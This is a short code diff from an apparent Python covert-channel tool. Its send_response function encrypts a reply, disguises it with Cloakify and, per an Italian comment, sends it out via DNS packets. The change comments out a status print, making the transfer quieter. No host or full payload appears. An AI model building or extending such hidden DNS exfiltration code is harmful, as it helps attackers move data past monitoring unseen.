@@ -62,7 +62,7 @@ def send_response(response):
     cloaked_response = "cloaked_response.txt"
     Cloakify(encrypted_response, cipher, cloaked_response)
     
-    print("Initializing response transfer")
+    #print("Initializing response transfer")
     TransferCloakedFile("cloaked_response.txt", 0.0)
     # Inviare la risposta tramite pacchetti DNS
     with open(cloaked_response, 'r') as file:
